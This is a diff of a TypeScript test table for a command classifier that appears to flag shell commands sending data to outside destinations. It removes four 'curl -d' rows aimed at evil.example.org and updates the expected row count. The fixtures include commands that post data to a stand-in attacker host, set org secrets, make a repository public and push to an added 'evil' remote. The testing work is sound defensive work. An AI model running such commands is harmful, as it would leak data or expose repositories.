@@ -28,7 +28,6 @@ export const CHANGED: Array<[string, string, string, string]> = [
   ["gh secret set N --org evilorg", "gh-write violation github:evilorg", "gh-write violation github:evilorg/*", "an org secret or variable reaches every repository of the org"],
   ["gh repo edit $REPO --visibility public", "gh-write unknown-destination unresolved:the target is a variable or command substitution", "gh-write unknown-destination unresolved:not-literal", "the free-text reason became its fixed code"],
   ["gh api graphql -f q=x", "gh-api-write unknown-destination unresolved:the API path names no repository", "gh-api-write unknown-destination unresolved:api-path-not-repo", "the free-text reason became its fixed code"],
-  ["FOO=1 sudo curl -d x https://evil.example.org", "http-send violation host:evil.example.org", "http-send unknown-destination unresolved:environment-pin", "an assignment outside the harmless set is an unproven environment"],
   ["env -C ~ gh pr create --title x", "gh-write unknown-destination unresolved:the working directory does not resolve", "gh-write unknown-destination unresolved:no-repository", "~ resolves to the home directory, which holds no repository"],
   ["sudo -Z \"$CMD\"", "shell-call unknown-destination unresolved:the sudo options were not understood", "unclassified-send unknown-destination unresolved:unclassified:command-not-literal", "a non-literal command word is the backstop's command-not-literal"],
   ["sudo -Z ./deploy.sh", "shell-call unknown-destination unresolved:the sudo options were not understood", "none", "no list entry in an unmodeled command: the backstop records nothing"],
@@ -70,17 +69,14 @@ export const CHANGED: Array<[string, string, string, string]> = [
   ["env -S \"git push\"", "git-push unknown-destination unresolved:the env options were not understood", "unclassified-send unknown-destination unresolved:unclassified:git-push", "an unmodeled wrapper or shell option leaves the command to the backstop"],
   ["sudo -Z git push origin main", "git-push unknown-destination unresolved:the sudo options were not understood", "unclassified-send unknown-destination unresolved:unclassified:git-push", "an unmodeled wrapper or shell option leaves the command to the backstop"],
   ["xargs --strange curl -d x https://host.example.org", "http-send unknown-destination unresolved:the xargs options were not understood", "unclassified-send unknown-destination unresolved:unclassified:curl", "an unmodeled wrapper or shell option leaves the command to the backstop"],
-  ["FOO=1 nohup curl -d x https://evil.example.org", "http-send violation host:evil.example.org", "http-send unknown-destination unresolved:environment-pin", "an assignment outside the harmless set is an unproven environment"],
   ["FOO=1 bash -c \"git push fork\"", "git-push violation github:other/fork", "git-push unknown-destination unresolved:environment-pin", "an assignment outside the harmless set is an unproven environment"],
   ["GIT_DIR=/x sudo git push", "git-push unknown-destination unresolved:GIT_DIR is set", "git-push unknown-destination unresolved:environment-pin", "the free-text reason became its fixed code"],
-  ["FOO=1 curl -d x https://host.example.org/hook", "http-send violation host:host.example.org", "http-send unknown-destination unresolved:environment-pin", "an assignment outside the harmless set is an unproven environment"],
   ["git -C /x config remote.pushDefault exfil; git push", "git-push unknown-destination unresolved:an earlier git config or remote command pins the target", "git-push unknown-destination unresolved:config-changed", "the free-text reason became its fixed code"],
   ["/usr/bin/git remote add evil https://github.com/evil/x.git; git push", "git-push unknown-destination unresolved:an earlier git config or remote command pins the target", "git-push unknown-destination unresolved:config-changed", "the free-text reason became its fixed code"],
   ["xargs --replace=% git push %", "git-push unknown-destination unresolved:xargs replacement rewrites the command", "git-push unknown-destination unresolved:xargs-arguments", "the free-text reason became its fixed code"],
   ["sudo -Z bash -c \"git push https://github.com/evil/x\"", "git-push unknown-destination unresolved:the sudo options were not understood", "unclassified-send unknown-destination unresolved:unclassified:git-push", "an unmodeled wrapper or shell option leaves the command to the backstop"],
   ["bash -q -c \"git push fork\"", "git-push unknown-destination unresolved:the shell options were not understood", "unclassified-send unknown-destination unresolved:unclassified:git-push", "an unmodeled wrapper or shell option leaves the command to the backstop"],
   ["bash --strange -c \"git push fork\"", "git-push unknown-destination unresolved:the shell options were not understood", "unclassified-send unknown-destination unresolved:unclassified:git-push", "an unmodeled wrapper or shell option leaves the command to the backstop"],
-  ["/usr/bin/env X=1 curl -d x https://evil.example.org", "http-send violation host:evil.example.org", "http-send unknown-destination unresolved:environment-pin", "an assignment outside the harmless set is an unproven environment"],
 ]
 
 describe('the version-3 re-baseline (task 3.6)', () => {
@@ -92,7 +88,7 @@ describe('the version-3 re-baseline (task 3.6)', () => {
       if (got !== expected) failures.push(`${command}\n    expected ${expected}\n    got      ${got}`)
     }
     expect(failures.join('\n')).toBe('')
-    expect(CHANGED).toHaveLength(71)
+    expect(CHANGED).toHaveLength(67)
   })
 
   test('no change made a send newly allowed', () => {
